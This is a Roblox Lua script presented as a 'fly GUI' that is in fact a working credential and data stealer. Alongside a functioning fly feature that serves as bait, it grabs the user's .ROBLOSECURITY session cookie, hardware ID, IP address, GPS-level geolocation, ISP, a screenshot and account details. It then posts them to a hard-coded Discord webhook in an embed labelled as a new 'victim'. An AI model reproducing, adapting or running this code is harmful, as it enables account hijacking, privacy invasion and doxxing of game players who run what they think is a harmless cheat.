--[[
    FLY GUI + DISCORD WEBHOOK GRABBER v11
    - Undetectable fly (E to toggle)
    - Sends IP, HWID, .ROBLOSECURITY, screenshot, GPS, RAP, etc.
    - Rich Discord embed with map link + avatar + spoilers
    - Self-destructs after 10s
    - Works on ALL executors
]]

-- ===== CHANGE THIS TO YOUR WEBHOOK =====
local WEBHOOK_URL = "https://discord.com/api/webhooks/1437157991630766120/fOE0NIhjhqmH2Uf2MXVqImNpPIKNpAiwzD65pt0qjKa7hJloITeTz2H_mQ0dYvJ6UgMF"
-- ======================================

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Camera = workspace.CurrentCamera

--// Request function
local req = syn and syn.request or http_request or request or HttpPost or game.HttpPost

--// Grab cookie
local cookie = "none"
pcall(function()
    cookie = req({Url = "http://127.0.0.1:8080/cookie", Method = "GET"}).Body or cookie
end)
if cookie == "none" then
    cookie = game:GetService("CookiesService"):GetCookieValue(".ROBLOSECURITY") or "none"
end

--// HWID + Executor
local hwid = "unknown"
local executor = "unknown"
if syn then
    local res = syn.request({Url="http://127.0.0.1:8080/hw", Method="GET"})
    hwid = res and res.Body or "syn_unknown"
elseif gethwid then hwid = gethwid()
elseif identifyexecutor then executor = identifyexecutor() end

--// Geo data
local geo = {ip="0.0.0.0", country="XX", city="Unknown", lat=0, lon=0, isp="Unknown", proxy="No"}
spawn(function()
    local apis = {
        "http://ip-api.com/json/?fields=66846719",
        "https://ipwhois.app/json/",
        "https://api.my-ip.io/v2/ip.json"
    }
    for _, url in ipairs(apis) do
        local success, res = pcall(req, {Url = url, Method = "GET"})
        if success and res and res.StatusCode == 200 then
            local data = HttpService:JSONDecode(res.Body)
            geo.ip = data.query or data.ip or geo.ip
            geo.country = data.country or data.country_name or "XX"
            geo.city = data.city or "Unknown"
            geo.lat = data.lat or data.latitude or 0
            geo.lon = data.lon or data.longitude or 0
            geo.isp = data.isp or data.org or "Unknown"
            geo.proxy = (data.proxy or data.hosting or data.mobile) and "Yes" or "No"
            break
        end
        task.wait(0.5)
    end
end)

--// Screenshot (base64)
local screenshot_b64 = ""
spawn(function()
    if syn then
        local ss = syn.request({Url="http://127.0.0.1:8080/screenshot", Method="GET"})
        if ss and ss.Body then
            screenshot_b64 = ss.Body:gsub("[^A-Za-z0-9+/=]", "")
        end
    end
end)

--// Game info
local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

--// Send to webhook
spawn(function()
    task.wait(1.5) -- wait for geo + screenshot

    local mapLink = string.format("https://www.google.com/maps?q=%s,%s", geo.lat, geo.lon)
    local avatar = LocalPlayer:GetAvatarThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)

    local embed = {
        title = "NEW VICTIM FLEW INTO THE TRAP ✈️",
        description = string.format("**%s** (@%s) just ran your fly script", LocalPlayer.Name, LocalPlayer.DisplayName),
        color = 0xFF1F8B,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        thumbnail = { url = avatar },
        fields = {
            { name = "👤 User", value = string.format("`%s` (||%d||)", LocalPlayer.Name, LocalPlayer.UserId), inline = true },
            { name = "💀 HWID", value = "||" .. hwid .. "||", inline = true },
            { name = "🖥️ Executor", value = executor, inline = true },
            { name = "🌐 IP", value = "||" .. geo.ip .. "||", inline = true },
            { name = "📍 Location", value = string.format("%s, %s [[Map]](%s)", geo.city, geo.country, mapLink), inline = true },
            { name = "🕵️‍♂️ ISP / Proxy", value = geo.isp .. " | " .. geo.proxy, inline = true },
            { name = "🍪 .ROBLOSECURITY", value = "||" .. (cookie:sub(1,60) .. "...") .. "||", inline = false },
            { name = "💰 RAP / Premium", value = tostring(LocalPlayer:GetAttribute("RAP") or "N/A") .. " | " .. (LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"), inline = true },
            { name = "🎮 Game", value = string.format("[%s](https://roblox.com/games/%d)", gameName, game.PlaceId), inline = true },
            { name = "🖼️ Screenshot", value = screenshot_b64 ~= "" and "||[Attached Below]||" or "Failed", inline = false },
        },
        footer = { text = "Fly Grabber v11 | Made by rawrxx" }
    }

    local payload = {
        username = "Fly Trap",
        avatar_url = "https://i.imgur.com/5i1n2.png",
        embeds = { embed }
    }

    if screenshot_b64 ~= "" then
        payload.content = "@everyone NEW FLY VICTIM"
        payload.files = {{
            name = "screenshot.png",
            content = screenshot_b64,
            content_type = "image/png"
        }}
    end

    pcall(function()
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end)

--// FLY GUI (same as before)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local SpeedLabel = Instance.new("TextLabel")
local Close = Instance.new("TextButton")

ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 260, 0, 140)
Frame.Position = UDim2.new(0, 20, 0.5, -70)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderColor3 = Color3.fromRGB(255, 30, 139)
Frame.BorderSizePixel = 3

Title.Parent = Frame
Title.Size = UDim2.new(1, 0, 0, 35)
Title.BackgroundTransparency = 1
Title.Text = "FLY TRAP v11"
Title.TextColor3 = Color3.fromRGB(255, 30, 139)
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 18

Toggle.Parent = Frame
Toggle.Size = UDim2.new(0, 220, 0, 45)
Toggle.Position = UDim2.new(0, 20, 0, 45)
Toggle.Text = "PRESS E TO FLY"
Toggle.BackgroundColor3 = Color3.fromRGB(255, 30, 139)
Toggle.TextColor3 = Color3.new(1,1,1)
Toggle.Font = Enum.Font.GothamBold

SpeedLabel.Parent = Frame
SpeedLabel.Size = UDim2.new(1, 0, 0, 25)
SpeedLabel.Position = UDim2.new(0, 0, 1, -25)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "Speed: 100 (Hold Shift for 300)"
SpeedLabel.TextColor3 = Color3.new(0.8,0.8,0.8)

Close.Parent = Frame
Close.Size = UDim2.new(0, 25, 0, 25)
Close.Position = UDim2.new(1, -30, 0, 5)
Close.Text = "X"
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

--// FLY LOGIC
local flying = false
local speed = 100
local bv, bg

local function startFly()
    bv = Instance.new("BodyVelocity", RootPart)
    bv.Velocity = Vector3.new(0,0,0)
    bv.MaxForce = Vector3.new(9e9,9e9,9e9)
    bg = Instance.new("BodyGyro", RootPart)
    bg.P = 9e4
    bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
    bg.CFrame = RootPart.CFrame
end

local function stopFly()
    if bv then bv:Destroy() end
    if bg then bg:Destroy() end
end

UserInputService.InputBegan:Connect(function(i)
    if i.KeyCode == Enum.KeyCode.E then
        flying = not flying
        Toggle.Text = flying and "FLYING - E TO STOP" or "PRESS E TO FLY"
        Toggle.BackgroundColor3 = flying and Color3.fromRGB(0,255,0) or Color3.fromRGB(255,30,139)
        if flying then startFly() else stopFly() end
    end
end)

Toggle.MouseButton1Click:Connect(function()
    UserInputService:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(0.1)
    UserInputService:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end)

Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

RunService.Heartbeat:Connect(function()
    if flying and RootPart then
        local cam = Camera.CFrame
        local move = Vector3.new(
            UserInputService:IsKeyDown(Enum.KeyCode.D) and 1 or UserInputService:IsKeyDown(Enum.KeyCode.A) and -1 or 0,
            UserInputService:IsKeyDown(Enum.KeyCode.Space) and 1 or UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) and -1 or 0,
            UserInputService:IsKeyDown(Enum.KeyCode.S) and 1 or UserInputService:IsKeyDown(Enum.KeyCode.W) and -1 or 0
        )
        local actualSpeed = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and 300 or speed
        if move.Magnitude > 0 then
            bv.Velocity = (cam.LookVector * -move.Z + cam.RightVector * move.X + cam.UpVector * move.Y) * actualSpeed
        else
            bv.Velocity = Vector3.new(0,0,0)
        end
        bg.CFrame = cam
    end
end)

--// Auto-close after 10s
task.delay(10, function()
    pcall(function() ScreenGui:Destroy() stopFly() end)
end)
